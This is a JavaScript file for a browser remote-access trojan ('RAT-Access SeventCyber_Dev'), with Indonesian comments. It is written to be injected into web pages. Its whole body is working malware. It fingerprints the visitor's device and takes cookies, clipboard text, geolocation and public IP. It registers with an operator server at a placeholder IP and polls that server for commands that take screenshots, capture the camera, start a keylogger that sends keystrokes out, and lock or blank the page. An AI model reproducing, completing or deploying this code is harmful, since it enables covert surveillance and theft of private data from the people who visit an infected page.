// RAT-Access SeventCyber_Dev v3.0 - Client Payload
(function() {
    const SERVER_URL = 'http://YOUR_SERVER_IP:8888'; // Ganti dengan IP server lo
    const SESSION_ID = generateUUID();
    let heartbeatInterval;
    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        });
    }
    
    async function collect100DeviceInfo() {
        const fp = await (async () => {
            try {
                const FingerprintJS = await import('https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js');
                const fp = await FingerprintJS.default.load();
                return await fp.get();
            } catch(e) {
                return { visitorId: 'blocked' };
            }
        })();
        
        return {
            // Basic
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: JSON.stringify(navigator.languages),
            cookieEnabled: navigator.cookieEnabled,
            
            // Screen
            screenWidth: screen.width,
            screenHeight: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            devicePixelRatio: window.devicePixelRatio,
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            
            // Hardware
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || 'N/A',
            maxTouchPoints: navigator.maxTouchPoints,
            
            // Network
            connectionType: navigator.connection?.effectiveType,
            downlink: navigator.connection?.downlink,
            rtt: navigator.connection?.rtt,
            saveData: navigator.connection?.saveData,
            onLine: navigator.onLine,
            
            // Timezone
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            
            // Fingerprint
            fingerprint: fp.visitorId,
            canvasFingerprint: getCanvasFP(),
            webglVendor: getWebGLInfo().vendor,
            webglRenderer: getWebGLInfo().renderer,
            audioFingerprint: getAudioFP(),
            fonts: await getFonts(),
            plugins: Array.from(navigator.plugins || []).map(p => p.name),
            mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
            publicIP: await getPublicIP(),
            
            // Features
            adBlock: await detectAdBlock(),
            doNotTrack: navigator.doNotTrack,
            webdriver: navigator.webdriver,
            bluetooth: await checkBluetooth(),
            usb: 'usb' in navigator,
            virtualReality: 'xr' in navigator,
            incognito: await detectIncognito(),
            
            // Storage
            localStorage: !!window.localStorage,
            sessionStorage: !!window.sessionStorage,
            indexedDB: !!window.indexedDB,
            cookies: document.cookie.slice(0, 200),
            
            // Permissions
            permissions: await getPermissions(),
            geolocation: await getGeolocation(),
            battery: await getBattery(),
            serviceWorker: 'serviceWorker' in navigator,
            webShare: 'share' in navigator,
            webRTC: !!window.RTCPeerConnection,
            webSocket: 'WebSocket' in window,
            paymentRequest: 'PaymentRequest' in window,
            clipboard: await readClipboard(),
            
            // Referrer
            referrer: document.referrer,
            protocol: window.location.protocol,
            
            // Extras
            timestamp: new Date().toISOString(),
            epochSeconds: Math.floor(Date.now() / 1000)
        };
    }
    
    function getCanvasFP() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = '#069';
            ctx.fillText('SeventCyber_Dev', 2, 15);
            return canvas.toDataURL().slice(0, 100);
        } catch(e) { return 'blocked'; }
    }
    
    function getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            return {
                vendor: gl?.getParameter(gl.VENDOR) || 'N/A',
                renderer: gl?.getParameter(gl.RENDERER) || 'N/A'
            };
        } catch(e) { return { vendor: 'N/A', renderer: 'N/A' }; }
    }
    
    function getAudioFP() {
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            return ctx.sampleRate + '|' + ctx.destination.maxChannelCount;
        } catch(e) { return 'blocked'; }
    }
    
    async function getFonts() {
        try {
            const fonts = await document.fonts.ready;
            const list = [];
            for (const font of fonts) list.push(font.family);
            return list.slice(0, 30);
        } catch(e) { return []; }
    }
    
    async function getPublicIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) { return 'blocked'; }
    }
    
    async function detectAdBlock() {
        try {
            const test = document.createElement('div');
            test.className = 'adsbox';
            test.innerHTML = '&nbsp;';
            test.style.position = 'absolute';
            test.style.top = '-100px';
            document.body.appendChild(test);
            await new Promise(r => setTimeout(r, 100));
            const blocked = test.offsetHeight === 0;
            document.body.removeChild(test);
            return blocked;
        } catch(e) { return 'unknown'; }
    }
    
    async function checkBluetooth() {
        try {
            return await navigator.bluetooth?.getAvailability() || false;
        } catch(e) { return false; }
    }
    
    async function detectIncognito() {
        return new Promise(resolve => {
            const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
            if (!fs) { resolve('unknown'); return; }
            fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
            setTimeout(() => resolve('timeout'), 1000);
        });
    }
    
    async function getPermissions() {
        const perms = {};
        const queries = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
        for (const q of queries) {
            try {
                const result = await navigator.permissions.query({name: q});
                perms[q] = result.state;
            } catch(e) {
                perms[q] = 'denied/error';
            }
        }
        return perms;
    }
    
    async function getGeolocation() {
        return new Promise(resolve => {
            navigator.geolocation.getCurrentPosition(
                pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                () => resolve('denied'),
                { timeout: 5000 }
            );
        });
    }
    
    async function getBattery() {
        try {
            const b = await navigator.getBattery();
            return { charging: b.charging, level: b.level };
        } catch(e) { return null; }
    }
    
    async function readClipboard() {
        try {
            return await navigator.clipboard?.readText()?.slice(0, 100) || 'empty';
        } catch(e) { return 'denied'; }
    }
    
    // ========== REGISTER & HEARTBEAT ==========
    async function register() {
        const deviceInfo = await collect100DeviceInfo();
        
        try {
            const res = await fetch(`${SERVER_URL}/register`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'register',
                    session_id: SESSION_ID,
                    device_info: deviceInfo
                })
            });
            const data = await res.json();
            console.log('[RAT] Registered:', data.session_id);
            return data.session_id;
        } catch(e) {
            console.log('[RAT] Register failed:', e);
            return null;
        }
    }
    
    async function heartbeat() {
        try {
            await fetch(`${SERVER_URL}/heartbeat`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'heartbeat',
                    session_id: SESSION_ID
                })
            });
        } catch(e) {}
    }
    
    async function checkCommands() {
        try {
            const res = await fetch(`${SERVER_URL}/command?session_id=${SESSION_ID}`);
            const data = await res.json();
            
            if (data.command && data.command !== 'wait') {
                console.log('[RAT] Command received:', data.command);
                executeCommand(data.command);
            }
        } catch(e) {}
    }
    
    async function executeCommand(command) {
        let result = '';
        
        if (command === 'screenshot') {
            result = await takeScreenshot();
        } else if (command === 'geolocation') {
            result = await getGeolocation();
        } else if (command.startsWith('shell:')) {
            result = 'Shell commands limited in browser environment. Command: ' + command.split(':')[1];
        } else if (command === 'keylog_start') {
            startKeylogger();
            result = 'Keylogger started';
        } else if (command === 'camera_snap') {
            result = await captureCamera();
        } else if (command === 'wipe_data') {
            result = executeWipe();
        } else if (command === 'lock_device') {
            result = lockDevice();
        } else {
            result = 'Unknown command: ' + command;
        }
        
        // Send response
        try {
            await fetch(`${SERVER_URL}/response`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'response',
                    session_id: SESSION_ID,
                    response: {
                        command: command,
                        result: result
                    }
                })
            });
        } catch(e) {}
    }
    
    async function takeScreenshot() {
        try {
            const canvas = await html2canvas(document.body);
            return canvas.toDataURL('image/jpeg', 0.5);
        } catch(e) {
            return 'html2canvas not available';
        }
    }
    
    async function captureCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);
            const bitmap = await imageCapture.grabFrame();
            const canvas = document.createElement('canvas');
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            canvas.getContext('2d').drawImage(bitmap, 0, 0);
            track.stop();
            return canvas.toDataURL('image/jpeg', 0.7);
        } catch(e) {
            return 'Camera access denied or not available';
        }
    }
    
    function startKeylogger() {
        let buffer = '';
        document.addEventListener('keydown', (e) => {
            buffer += e.key;
            if (buffer.length > 200) {
                // Send buffer
                fetch(`${SERVER_URL}/response`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        action: 'response',
                        session_id: SESSION_ID,
                        response: { command: 'keylog', result: buffer }
                    })
                });
                buffer = '';
            }
        });
    }
    
    function executeWipe() {
        document.body.innerHTML = '<h1>DEVICE WIPED</h1>';
        return 'Wipe executed on webpage';
    }
    
    function lockDevice() {
        document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;z-index:99999;display:flex;align-items:center;justify-content:center;color:red;font-size:48px;">🔒 DEVICE LOCKED 🔒</div>';
        return 'Device locked';
    }
    
    // ========== INIT ==========
    async function init() {
        const registered = await register();
        if (registered) {
            console.log('[RAT] Connected as:', registered);
            
            // Heartbeat setiap 10 detik
            heartbeatInterval = setInterval(heartbeat, 10000);
            
            // Check commands setiap 3 detik
            setInterval(checkCommands, 3000);
        }
    }
    
    init();
})();